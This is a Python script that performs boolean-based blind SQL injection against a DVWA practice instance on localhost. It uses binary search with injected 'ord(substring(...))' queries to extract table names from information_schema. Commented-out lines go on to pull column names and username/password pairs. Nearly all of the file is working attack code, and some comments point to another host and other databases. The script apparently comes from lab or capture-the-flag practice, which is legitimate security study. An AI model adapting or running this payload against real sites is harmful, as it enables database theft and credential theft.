import requests
import re
from bs4 import BeautifulSoup
import hashlib

url = "http://localhost/DVWA/vulnerabilities/sqli/"

payload = {
	"id": "1",
    "Submit": "Submit"
}

def send_request(url, payload, method):
    s = requests.Session()
    cookie = {
        "PHPSESSID": "kb7opmp85s5pr4tinh1050us5q",
        "security": "low"
    }
    if method == "GET":
        res = s.get(url, params=payload, cookies=cookie, allow_redirects=False)
    elif method == "POST":
        res = s.post(url, data=payload, cookies=cookie, allow_redirects=False)
    print(res.status_code)

    return res

def check(data):
	return re.search("First name:", data)

def blind(kolom,table):
    passwd = ""
    idx = 1

    while (True):
        soup = BeautifulSoup(send_request(url, payload, "GET").text, features="html.parser")
        lo = 1
        hi = 255
        temp = -1
        while(lo <= hi):
            # csrf = soup.find('input', {'name': '_token'}).get('value')

	        #     "password":hashlib.sha1("test").hexdigest(),
            #     "_token":csrf
            # }
            # print csrf
            
            mid = int((lo + hi) / 2)
            payload["id"] = "1' AND (select ord(substring({},{},1)) from {}) <= {} #".format(str(kolom),str(idx),str(table),str(mid))
            # print(payload['id'])
            #print "select * from users where username ='" + payload['username']
            res = send_request(url, payload, "GET")
            #print res.url
            if check(res.text):
                # res = s.get("http://192.168.0.104:5501/auth/logout.php")
                # print res.url
                print("Correct")
                hi = mid-1
                temp = mid
                print("temp: " + str(temp))
            else:
                lo = mid+1
            soup = BeautifulSoup(res.text, features="html.parser")
               
        if (hi == 0): break
        passwd += chr(temp)
        print("Result [{}]: {}".format(table,passwd))
        idx += 1

    return passwd
   
# get table name
blind("group_concat(table_name)", "information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61")
# blind("group_concat(table_name, ' ', table_schema)", "information_schema.tables where table_schema not in ('information_schema', 'main_db', 'file_db', 'mysql', 'performance_schema') order by table_schema desc")
# blind("group_concat(table_name, ' ', table_schema)", "information_schema.tables where table_schema = 'server_db' order by table_schema desc")
# Result: files, posts, role_details, roles, users

# get column name
# blind("group_concat(column_name)", "information_schema.columns where table_name='servers'")

# get data
# blind("group_concat(name,' ',password)", "server_db.servers")
# blind("group_concat(username,' ',password)", "users")